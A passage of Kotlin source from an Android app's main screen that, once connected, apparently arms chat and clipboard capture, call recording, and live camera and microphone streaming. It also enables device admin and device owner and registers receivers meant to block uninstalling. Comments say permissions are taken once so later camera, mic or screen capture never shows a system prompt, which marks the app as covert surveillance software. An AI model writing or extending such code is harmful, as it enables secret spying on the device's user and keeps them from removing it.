        tvChatsExplain.visibility = if (hasListener) View.VISIBLE else View.GONE
        switchChats.isChecked = hasListener && Prefs.chatsSyncEnabled(this)
        switchClipboard.visibility = View.VISIBLE
        tvClipboardExplain.visibility = View.VISIBLE
        switchClipboard.isChecked = Prefs.clipboardSyncEnabled(this)
        // When admin is active, the disconnect / uninstall button is hidden so
        // the state is visible on the connected screen. The app is still
        // uninstallable — the user deactivates admin in Settings first ("Device
        // admin OFF" toast in AdminReceiver tells them).
        updateDeviceAdminButton()
        updateDeviceOwnerButton()
        // Usage access gates the app inventory + screen-time list, so the
        // button is shown exactly when it is still missing.
        val hasUsage = AppUsageWorker.hasUsageAccess(this)
        btnUsageAccess.visibility = if (hasUsage) View.GONE else View.VISIBLE
        switchCalls.visibility = View.VISIBLE
        tvCallExplain.visibility = View.VISIBLE
        switchCalls.isChecked = Prefs.callRecordingArmed(this)
        // This block was repeated three times by an earlier bad multi-edit.
        // The repeats compiled (the statements are idempotent) but they are
        // dead code, so they are gone now.
        switchCameraLive.visibility = View.VISIBLE
        tvCameraLiveExplain.visibility = View.VISIBLE
        switchCameraLive.isChecked = CameraLiveService.isArmed(this)
        switchMicLive.visibility = View.VISIBLE
        tvMicLiveExplain.visibility = View.VISIBLE
        switchMicLive.isChecked = MicLiveService.isArmed(this)
        // Device admin + device owner toggle state visible on the connected screen.
        updateDeviceAdminButton()
        updateDeviceOwnerButton()
        ClipboardWorker.install(this)
        if (Prefs.callRecordingArmed(this)) CallRecorderService.start(this)
        // Uninstall-protect receiver registered once per process.
        UninstallInterceptReceiver.register(this)
        DeviceOwnerProtectService.register(this)
        connected = true
        tvConnection.visibility = View.VISIBLE
        tvConnection.text = buildString {
            append(getString(R.string.connected_status))
            append('\n')
            append(ServiceStatus.summary())
        }
        uiHandler.removeCallbacks(syncReadout)
        uiHandler.postDelayed(syncReadout, 3_000)
        requestRuntimePermissions()
    }

    /**
     * The one-time permission batch, and nothing else.
     *
     * This delegates to [PermissionSetup], which is the only place in the app
     * allowed to call `requestPermissions`. It runs at most once per install,
     * so no later action — a photo, live camera, live mic, screen mirroring —
     * can ever open a system dialog.
     *
     * The Settings toggles (notification listener, usage access, all files) are
     * NOT forced open here. Yanking the user into three Settings screens during
     * setup, unprompted, is its own kind of hostile; they are surfaced in Setup
     * with a button each instead, and the summary below tells the owner
     * exactly what is still outstanding.
     */
    private fun requestRuntimePermissions() {
        PermissionSetup.runOnce(this)
        updateSetupSummary()
    }

    private fun hasRuntimePermission(permission: String): Boolean =
        checkSelfPermission(permission) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED

    /**
     * Says a permission is missing WITHOUT asking for it.
     *
     * The old code called `requestPermissions` from inside three feature
     * switches, which is why the same permission could be demanded twice from
     * two different screens and why using the app felt like it was constantly
     * asking for something. Setup is the single place that asks; everywhere
     * else just reports.
     */
    private fun explainMissingPermission(feature: String) {
        Toast.makeText(
            this,
            "$feature ke liye permission nahi hai. App me Setup kholo — wo ek hi jagah sab permission maangta hai.",
            Toast.LENGTH_LONG,
        ).show()
    }

    /** Live, truthful list of what Setup still needs. Never prompts. */
    private fun updateSetupSummary() {
        val missing = PermissionSetup.summary(this)
        if (!::tvSetupSummary.isInitialized) return
        tvSetupSummary.text = if (missing.isEmpty()) {
            getString(R.string.setup_complete)
        } else {
            getString(R.string.setup_missing) + "\n• " + missing.joinToString("\n• ")
        }
        tvSetupSummary.visibility = View.VISIBLE
        btnSetup.visibility =
            if (missing.isEmpty()) View.GONE else View.VISIBLE
        btnUsageAccess.visibility =
            if (PermissionSetup.hasUsageAccess(this)) View.GONE else View.VISIBLE
    }

    private fun hasNotificationListenerPermission(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners",
        ) ?: return false
        return enabled.contains(packageName)
    }
}
